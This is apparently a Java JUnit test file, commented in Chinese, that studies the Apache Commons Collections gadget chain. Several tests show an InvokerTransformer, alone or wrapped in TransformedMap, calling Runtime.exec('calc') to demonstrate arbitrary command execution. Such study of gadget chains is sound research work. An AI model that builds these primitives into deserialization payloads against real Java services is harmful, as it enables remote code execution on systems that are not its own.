package com.pwjcw.test;

import org.apache.commons.collections.OrderedMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LinkedMap;
import org.apache.commons.collections.map.TransformedMap;
import org.junit.Test;

import java.util.HashMap;
import java.util.Map;

public class TestCC01 {

    /**
     * 测试一下commons collections的功能
     */
    @Test
    public void testcc(){
        OrderedMap map=new LinkedMap();
        map.put("one","111");
        map.put("two",222);
        map.put("three",333);
        map.put("four",444);
        for (Object key:map.keySet()){
            System.out.println(key+":"+map.get(key));
        }
    }

    /**
     * 测试transform方法是否能进行执行任意命令
     */
    @Test
    public void testtransform(){
        //首先构造一个Runtime对象
        Runtime runtime = Runtime.getRuntime();
        //设置InvokerTransformer构造方法的参数
        String MethodName="exec";
        Class[] paramTypes=new Class[]{String.class};
        Object[] arg=new Object[]{"calc"};
        InvokerTransformer invokerTransformer = new InvokerTransformer(MethodName, paramTypes, arg);
        //调用方法，传入Runtime对象
        invokerTransformer.transform(runtime);
    }

    /**
     * 测试TransformedMap类里面的checkSetValue方法
     */

    @Test
    public void testTranformMapWithcheckSetValue() {
        //构造TransformedMap.decorate方法的参数
        Map map=new HashMap();
        //构造keyTransformer参数,keyTransformer是InvokerTransformer的实例化的对象
        Runtime runtime = Runtime.getRuntime();
        String MethodName="exec";
        Class[] paramTypes=new Class[]{String.class};
        Object[] arg=new Object[]{"calc"};
        InvokerTransformer invokerTransformer = new InvokerTransformer(MethodName, paramTypes, arg);
        //调用decorate方法，传入参数
        Map tranformedmap = TransformedMap.decorate(map,  invokerTransformer,null);

        //调用tranformedmap的put方法
        tranformedmap.put(runtime,"value") ;

    }
    //下面这个测试类是上面的简化版本
    @Test
    public void test4(){
        Map hashMap = new HashMap();
        Map transformedmap = TransformedMap.decorate(hashMap, null, new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}));
        transformedmap.put("key",Runtime.getRuntime());

    }
    //通过以Value参数的方式传入Runtime对象
    @Test
    public void test5(){
        Map hashMap=new HashMap();
        Map decorate = TransformedMap.decorate(hashMap, new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),null);
        decorate.put(Runtime.getRuntime(),"value");
    }
}


